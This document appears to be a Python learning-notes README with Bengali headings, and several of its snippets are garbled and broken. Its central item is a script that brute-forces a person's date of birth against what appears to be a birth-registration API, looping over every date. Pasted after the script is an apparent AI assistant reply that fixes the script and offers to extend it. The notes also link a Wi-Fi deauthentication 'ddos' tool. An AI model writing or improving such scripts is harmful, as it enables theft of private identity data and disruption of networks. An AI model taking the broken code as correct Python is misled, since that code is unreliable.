# Python-lerne


##  যে কোনো স্থানে কোনো কিছু টাইপ করে নেওয়া।

nid=str(input(" what is the number :-- ")

dob=int(input(" what is the day:-) 

How to ----- ---- 
       ----- ----- 

       print(45*"-")

       





## কত গুলো sms সেন্ট করতে পারবো।


10=str(input(" WHAT is the amaunt")

2 টাই ব্যাবহার করতে পারব।

for i range (10) or

printe(str(i+1)+"Sent SmS")

## tool oftion add

import os

while True:

	os.system("clear") 
 
	print(" [1] frist tool \n [2] secant tool \n [3] thert tool")
 
	opt=str(input("what is the selet no:-- "))
	
if opt=="1":
	os.system("python3 1.py")
	
elif opt==2:
	os.system("python3 2.py")
	
elif opt==3:
	os.system("python3 3.py")
 
else:

print("[x] wrong valo inter")
  

## typing kote thakbr



# Iterating through possible date combinations
for year in range(start_year, end_year + 1):  # Using user input for year range
    for month in range(1, 13):  # Months 1-12
        for day in range(1, 32):  # Days 1-31 (handling invalid dates later)
            try:
                dob = f"{year:04d}-{month:02d}-{day:02d}"  # Formatting DOB
                payload = {"ubrn": ubrn, "dob": dob}

                response = requests.post(url, data=json.dumps(payload), headers=headers)
                response_data = response.json()

                response_code = response_data.get("responseCode")
                print(f"Trying DOB: {dob} -> Response Code: {response_code}")

                if response_code == 0:  # If response code is 0, stop execution
                    print("Response code is 0, stopping execution.")
                    exit()

                if response_code == "SUCCESS":  # Adjust based on actual success response
                    print(f"Valid DOB found: {dob}")
                    exit()  # Stop execution if a valid DOB is found

            except Exception as e:
                print(f"Error with DOB {dob}: {e}")
Improvements & Fixes:
Proper Indentation

Fixed incorrect indentation under except, avoiding syntax errors.
Stopping Execution on Response Code 0

If responseCode == 0, the script prints a message and stops immediately.
Stops on Successful DOB Match

If responseCode == "SUCCESS", execution stops.
Would you like to add date validation (e.g., handling February 30, leap years)?




## wifi ddos

https://github.com/flashnuke/wifi-deauth



